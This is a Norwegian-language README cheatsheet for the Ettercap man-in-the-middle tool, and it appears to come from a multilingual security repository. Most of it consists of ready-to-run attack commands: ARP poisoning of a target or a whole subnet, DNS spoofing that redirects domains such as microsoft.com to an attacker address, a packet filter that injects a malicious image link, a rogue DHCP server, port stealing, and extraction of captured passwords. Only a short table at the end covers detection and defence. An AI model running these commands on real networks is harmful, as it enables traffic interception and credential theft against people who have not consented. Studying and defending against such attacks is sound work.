<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# Ettercap Cheatsheet

[Ettercap](https://www.ettercap-project.org/) er en omfattende pakke for man-in-the-middle (MITM)-angrep på lokalnettverk (LAN). Den har sniffing av direkteforbindelser, innholdsfiltrering i farten, aktiv og passiv disseksjon av mange protokoller, og støtte for ARP-forgiftning, ICMP-omdirigeringer, DHCP-spoofing og porttyveri.

---

## Innholdsfortegnelse

- [Kjernearkitektur og moduser](#kjernearkitektur--moduser)
- [Installasjon og hurtigoppsett](#installation--quick-setup)
- [ARP-forgiftning og sniffing](#arp-forgiftning--sniffing)
- [DNS-spoofing-angrep](#dns-spoofing-attacks)
- [Custom Packet Filtering (`etterfilter`)](#custom-packet-filtering-etterfilter)
– [DHCP-forfalskning og porttyveri](#dhcp-spoofing--port-stealing)
- [Logging og pakkeutvinning](#logging--pakkeutvinning)
- [Defensiv deteksjon og mottiltak](#defensiv-deteksjon--mottiltak)

---

## Kjernearkitektur og moduser

Ettercap støtter flere utførelsesmoduser:
- **`-T` (tekstmodus):** Lett, ikke-forbannet terminalutgang ideell for skripting og hodeløs automatisering.
- **`-C` (Curses-modus):** Ncurses-basert terminalgrensesnitt for interaktive operasjoner uten X11.
- **`-G` (GTK-modus):** Fullt grafisk grensesnitt.
- **`-D` (Daemon-modus):** Kjører stille i bakgrunnen.

Målspesifikasjonssyntaks:
```text
/MAC/IPs/IPv6/PORTs
```
- Mål kan være kommaseparert eller IP-områder: `//` matcher alt.
- Eksempel: `/192.168.1.50/` målretter IP `192.168.1.50` på alle porter.
- Eksempel: `//80,443/` retter seg mot alle verter på portene 80 og 443.

---

## Installasjon og hurtigoppsett
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Enable IP forwarding on the host system
sudo sysctl -w net.ipv4.ip_forward=1
```
Bekreft plassering av konfigurasjonsfilen:
- `/etc/ettercap/etter.conf`: Konfigurasjon av kjernenettverk og rettighetsslipp.
- `/etc/ettercap/etter.dns`: Oppslagstabell for DNS-spoofing-poster.

---

## ARP-forgiftning og sniffing

### 1. Toveis ekstern ARP-forgiftning
Poison ARP-tabeller mellom en målarbeidsstasjon og nettverksporten:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T`: Tekstmodus.
- `-q`: Stille modus (reduserer ordlyd, viser kun innhentet legitimasjon).
- `-i eth0`: Lytte- og injeksjonsnettverksgrensesnitt.
- `-M arp:remote`: Utfør toveis mann-i-midten ARP-forgiftning.

### 2. Sniffing av hele undernettet (enveis / kringkasting)
Forgift alle verter på subnettet mot standard gateway:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```
### 3. Bare passiv sniffing
Registrer legitimasjon i ren tekst som går gjennom den gjeldende verten uten ARP-spoofing:
```bash
sudo ettercap -T -q -i eth0
```
---

## DNS-spoofing-angrep

Ettercap inkluderer innebygde plugins, inkludert `dns_spoof`.

### Trinn 1: Konfigurer `/etc/ettercap/etter.dns`
Legg til jokertegn eller spesifikk domeneomadressering:
```text
# Redirect target domain to attacker machine
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```
### Trinn 2: Start Ettercap med DNS-plugin
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-P dns_spoof`: Aktiverer DNS-spoofing-plugin.
- Avlyttede DNS-spørringer som samsvarer med `etter.dns` returnerer angriperens IP.

---

## Egendefinert pakkefiltrering (`etterfilter`)

Ettercap tillater pakkeinspeksjon i sanntid og endring av nyttelast ved å bruke tilpassede filterskript.

### 1. Skriv filterskript (`replace_img.filter`)
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Injected malicious image link!\n");
}
```
### 2. Kompiler filter med `etterfilter`
```bash
etterfilter replace_img.filter -o replace_img.ef
```
### 3. Kjør med Filter
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```
---

## DHCP-spoofing og porttyveri

### 1. Rogue DHCP Server Attack
Svar raskere enn den legitime DHCP-serveren for å tildele falske gateway- og DNS-adresser:
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- Syntaks: `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`

### 2. Port-tyveri-angrep (Switch Flooding / CAM-tabellmisbruk)
Stjele trafikk på byttede nettverk der ARP-forgiftning er blokkert eller varslet:
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```
---

## Logging og pakkeutvinning

### Lagre Rå-fangede økter
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap`: Skriv rå pcap-pakkedata.
- `-L ettercap_log`: Skriv dissekerte menneskelesbare tekstlogger.

### Konverter binære logger med `etterlog`
```bash
# Print captured credentials and passwords
etterlog -p ettercap_log.eci

# Extract traffic in pcap format
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```
---

## Defensiv deteksjon og mottiltak

| Vektor | Deteksjons- og forsvarsmekanisme |
|---|---|
| **ARP-spoofing** | Aktiver Dynamic ARP Inspection (DAI) på administrerte brytere; inspiser `arp -a` for dupliserte MAC-er; kjør `arpwatch` eller `arpon`. |
| **DNS-spoofing** | Håndhev DNSSEC, DoH (DNS-over-HTTPS) eller DoT (DNS-over-TLS). |
| **DHCP-forfalskning** | Aktiver DHCP-snooping på brytere for å angi pålitelige opplink-porter. |
| **Porttyveri** | Implementer 802.1X Network Access Control (NAC) og portsikkerhet med MAC-grenser per svitsjport. |